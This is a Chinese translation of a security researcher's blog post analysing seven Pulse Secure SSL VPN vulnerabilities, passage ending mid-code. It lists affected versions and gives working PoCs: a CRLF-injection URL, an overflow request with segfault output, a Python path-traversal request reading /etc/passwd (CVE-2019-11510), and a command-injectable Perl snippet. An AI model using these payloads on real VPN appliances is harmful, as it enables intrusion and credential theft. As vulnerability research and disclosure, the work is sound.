# Pulse Secure SSL VPN远程代码执行漏洞利用与分析
##### 译文声明
本文是翻译文章，文章原作者 orange，文章来源：blog.orange.tw
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
这是攻击SSL VPN系列的最后一部分。如果您还没有阅读过以前的文章，请点击以下链接：
  * [像NSA一样渗透企业内部网：在SSL VPN领导厂商的VPN上进行RCE利用](https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf)
  * [攻击SSL VPN – 第1部分：Palo Alto GlobalProtect上的PreAuth RCE，以Uber作为利用案例](https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html)
  * [攻击SSL VPN – 第2部分：利用Fortigate SSL VPN](https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html)
我们在Black
Hat发表我们的研究之后，由于这些漏洞的严重性和巨大影响，它得到了广泛的关注和讨论。很多人都希望得到第一手消息，并想知道什么时候会发布漏洞利用代码，特别是Pulse
Secure preAuth RCE的利用。
我们也在内部进行了讨论。实际上，我们可以毫无顾虑地马上发布漏洞利用细节，并获得大量的关注度。但是，作为一家安全公司，我们的责任是让世界更加安全。因此，我们决定推迟公开披露利用细节，让厂商有更多时间来打补丁！
不幸的是，前段时间有其他人披露了这些漏洞的利用细节。可以很容易在GitHub
[_](https://github.com/projectzeroindia/CVE-2019-11510)和exploit-db
[上找到](https://www.exploit-db.com/exploits/47297)。
我们听说有超过25个漏洞赏金计划都在收集此漏洞利用。根据Bad
Packet的统计数据，众多500强企业，美国军方，政府，金融机构和大学也受此漏洞影响。甚至有10个NASA服务器都存在此漏洞。因此，过早的公开披露细节确实迫使这些企业升级其SSL
VPN。
另一方面越来越多的僵尸网络在扫描公网。因此，如果尚未更新Palo Alto，Fortinet或Pulse Secure SSL VPN，请尽快更新！
## 0x00 Pulse Secure
Pulse Secure是SSL VPN的市场领导者，为IT市场提供专业的安全解决方案。我们已经研究Pulse
Secure的产品很长一段时间了，因为它是Google的关键硬件基础设施，这是我们的长期目标之一。
但是，Google应用了Zero Trust安全模型，因此现在已不使用VPN。
我们去年12月中旬开始研究Pulse Secure。在前两个月，我们一无所获，Pulse
Secure具有良好的编码风格和安全意识，因此很难找到漏洞。这是一个有趣的比较，我们在研究FortiGate SSL
VPN上发现任意文件读取漏洞（CVE-2018-13379）
Pulse Secure的开发团队也是Perl爱好者，并在C ++中编写了大量的Perl扩展。Perl和C
++之间的交互也让我们感到困惑，但是当我们花费更多时间挖掘它时，我们对它也更加熟悉了。最后，我们在2019年3月8日得到了 first
blood！它是管理界面上的一个栈溢出漏洞！虽然这个bug没那么有用，但是我们的研究进展从那时起就开始了，我们发现了越来越多的bug。
我们在2019年3月22日报告了Pulse Secure PSIRT的所有发现。他们的处理很快，他们认真修复处理了这些漏洞！在与Pulse
Secure进行了多次电话会议后，他们在一个月内修复了所有漏洞，并于2019年4月24日发布了补丁。
这是与Pulse Secure的一次良好合作合作。从我们的角度来看，Pulse Secure是我们报告漏洞的所有SSL VPN供应商中最负责任的供应商！
## 0x01挖掘的漏洞
我们总共发现了7个漏洞，后面将介绍每一个漏洞，但更多关注CVE-2019-11510和CVE-2019-11539这两个漏洞。
  * CVE-2019-11510 – Pre-auth任意文件读取漏洞
  * CVE-2019-11542 – 管理员授权后堆栈缓冲区溢出漏洞
  * CVE-2019-11539 – 管理员授权后命令注入漏洞
  * CVE-2019-11538 – 用户授权后通过NFS进行任意文件读取漏洞
  * CVE-2019-11508 – 用户通过NFS进行授权后任意文件写入漏洞
  * CVE-2019-11540 – 授权后跨站脚本包含漏洞
  * CVE-2019-11507 – 授权后跨站脚本攻击
## 0x02 受影响版本
  * Pulse Connect Secure 9.0R1 – 9.0R3.3
  * Pulse Connect Secure 8.3R1 – 8.3R7
  * Pulse Connect Secure 8.2R1 – 8.2R12
  * Pulse Connect Secure 8.1R1 – 8.1R15
  * Pulse Policy Secure 9.0R1 – 9.0R3.3
  * Pulse Policy Secure 5.4R1 – 5.4R7
  * Pulse Policy Secure 5.3R1 – 5.3R12
  * Pulse Policy Secure 5.2R1 – 5.2R12
  * Pulse Policy Secure 5.1R1 – 5.1R15
## 0x03 漏洞分析
###  1.CVE-2019-11540：跨站脚本包含漏洞
脚本/dana/cs/cs.cgi用于在JavaScript中呈现会话ID，当内容类型设置为：
    application/x-javascript
我们可以执行XSSI攻击来窃取DSID cookie！
更糟糕的是，Pulse Secure SSL VPN中的CSRF保护基于DSID。有了这个XSSI，我们可以绕过所有的CSRF保护！
PoC如下：
###  2.CVE-2019-11507：跨站脚本攻击
有一个CRLF注入
    /dana/home/cts_get_ica.cgi
由于这个注入漏洞，我们可以伪造任意HTTP头并注入恶意HTML内容。
PoC如下：
    https://sslvpn/dana/home/cts_get_ica.cgi
    ?bm_id=x
    &vdi=1
    &appname=aa%0d%0aContent-Type::text/html%0d%0aContent-Disposition::inline%0d%0aaa:bb
###  3.CVE-2019-11538：通过NFS进行授权后任意文件读取
以下两个漏洞（CVE-2019-11538和CVE-2019-11508）不会影响默认配置。仅当管理员为VPN用户配置NFS共享时才会出现。
如果攻击者可以控制远程NFS服务器上的任何文件，他只需创建指向任何文件的符号链接，例如
    /etc/passwd
并从Web界面读取它，漏洞根本原因是NFS的实现将远程服务器挂载为真正的Linux目录，并且脚本
    /dana/fb/nfs/nfb.cgi
不检查所访问的文件是否是符号链接！
###  4.CVE-2019-11508：通过NFS进行授权后任意文件写入
这个有点类似于前一个漏洞，但有不同的攻击向量（attack vector）！
当攻击者通过Web界面将ZIP文件上载到NFS时，脚本
    /dana/fb/nfs/nu.cgi
不会清理ZIP中的文件名，因此，攻击者可以构建恶意ZIP文件并使用
    ../
文件名遍历路径！一旦Pulse Secure解压缩，攻击者就可以将任何他想要的内容上传到任何路径！
###  5.CVE-2019-11542：管理员授权后缓冲区溢出漏洞
在以下Perl模块实现中存在基于堆栈的缓冲区溢出漏洞：
  * DSHC :: ConsiderForReporting
  * DSHC :: isSendReasonStringEnabled
  * DSHC :: getRemedCustomInstructions
这些实现用于
    sprintf
连接字符串而不进行任何长度检查，就会导致缓冲区溢出，这个bug可以在很多地方触发
    /dana-admin/auth/hc.cgi
PoC：
    https://sslvpn/dana-admin/auth/hc.cgi
    ?platform=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    &policyid=0
可以从输出观察到段错误：
    dmesg
    cgi-server[22950]: segfault at 61616161 ip 0000000002a80afd sp 00000000ff9a4d50 error 4 in DSHC.so[2a2f000+87000]
###  6.CVE-2019-11510：Pre-auth任意文件读取漏洞
这是最严重的一个漏洞，Pulse Secure开发自己的Web服务器和架构，原始路径验证非常严格。但是，从版本8.2开始，Pulse
Secure引入了一项名为HTML5
Access的新功能，它是一种用于通过浏览器与Telnet，SSH和RDP交互的功能。由于这个新功能，原始路径验证变得松散。
为了处理静态资源，Pulse Secure创建了一个新的IF-CONDITION来扩展最初的严格路径验证。错误地使用了request->uri
和request->filepath，因此我们可以指定：
    /dana/html5acc/guacamole/
查询字符串的末尾以绕过验证并request->filepath生成要下载的任何文件！
为了读取任意文件，必须再次指定路径：
    /dana/html5acc/guacamole/
路径的中间位置，否则，只能下载有限的文件扩展名，例如.json，.xml或.html。
由于此漏洞会被在野利用，因此不再发布具体的payload：
    import requests
    r = requests.get('https://sslvpn/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/')
    print r.content
###  7.CVE-2019-11539：授权后（admin）命令注入
最后一个是管理接口上的命令注入，我们很早就发现了这个漏洞，但最初找不到利用它的方法。当我们在拉斯维加斯时，我的一个朋友告诉我他之前发现了同样的问题，但他没有找到利用它的方法，因此他没有向供应商报告。
但是，我们做到了，我们以非常聪明的方式利用了它:)
这个漏洞的触发原因非常简单。这是一段/dana-admin/diag/diag.cgi的代码片段：
    # ...
    $options = tcpdump_options_syntax_check(CGI::param("options"));
    # ...
    sub tcpdump_options_syntax_check {
      my $options = shift;
      return $options if system("$TCPDUMP_COMMAND -d $options >/dev/null 2>&1") == 0;
      return undef;
    }
常明显的options参数命令注入
但是，并没有那么简单被利用，为了避免潜在的漏洞，Pulse
Secure在其产品上应用了大量的hardenings工具！比如系统完整性检查，只读文件系统和挂载所有危险的Perl调用模块，比如：system，open，backtick
这个模块被DSSAFE.pm调用，它实现了自己的命令行解析器，并重新实现了Perl中的I /
O重定向。这是Gist上的[代码片段](https://gist.github.com/orangetw/d8df11b147629bb320e7db903c7e7147)。
    # ...
    @EXPORT = qw(open popen ppopen close system psystem exec backtick pbacktick
                 maketemp untaint is_tainted);
    # ...
    sub __parsecmd {
        my $cmd = shift;
        my @args = quotewords('s+', 1, $cmd);
        my @env = (); # currently not used. pending review.
        my @xargs = (); # arguments of the command
        my ($xcmd, $fout, $fin, $ferr, $mout, $min, $merr, $rd2);
        while (@args) {
            my $arg = shift @args;
            next if (length($arg) == 0);
            unless (defined $xcmd) {
                if ($arg =~ /^(w+)=(.+)$/) {
                    push @env, {$1 => $2};
                    next;
                } elsif ($arg =~ /^[^/a-zA-Z]/) {
                    __log("Invalid command: $cmd"); # must be / or letter
                    return undef;
                }
                $xcmd = untaint($arg);
                next;
            }
            if ($arg =~ /^(2|1)>&(2|1)$/) {